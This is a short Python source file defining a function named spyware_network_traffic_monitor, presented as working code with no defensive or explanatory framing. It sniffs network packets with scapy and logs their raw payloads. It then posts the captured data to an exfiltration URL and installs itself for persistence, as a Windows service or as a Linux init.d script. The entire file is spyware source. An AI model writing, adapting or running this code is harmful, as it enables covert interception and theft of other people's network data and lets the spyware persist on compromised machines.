import os
import platform
import requests
import subprocess
from scapy.all import sniff, Raw

def spyware_network_traffic_monitor(output_file: str, exfiltration_url: str) -> None:
    def packet_callback(packet):
        if packet.haslayer(Raw):
            with open(output_file, 'a') as f:
                f.write(packet[Raw].load.decode('utf-8', errors='ignore'))
    
    def send_data():
        with open(output_file, 'r') as f:
            data = f.read()
        requests.post(exfiltration_url, data=data)
    
    def create_persistence():
        system = platform.system()
        if system == "Windows":
            subprocess.run(["sc", "create", "MonitorService", "binPath=", "C:\\path\\to\\your\\script.py"])
        elif system == "Linux":
            with open('/etc/init.d/monitor', 'w') as f:
                f.write('#!/bin/bash\npython3 /path/to/your/script.py &')
            subprocess.run(["chmod", "+x", "/etc/init.d/monitor"])
            subprocess.run(["update-rc.d", "monitor", "defaults"])
    
    sniff(prn=packet_callback, store=0)
    send_data()
    create_persistence()

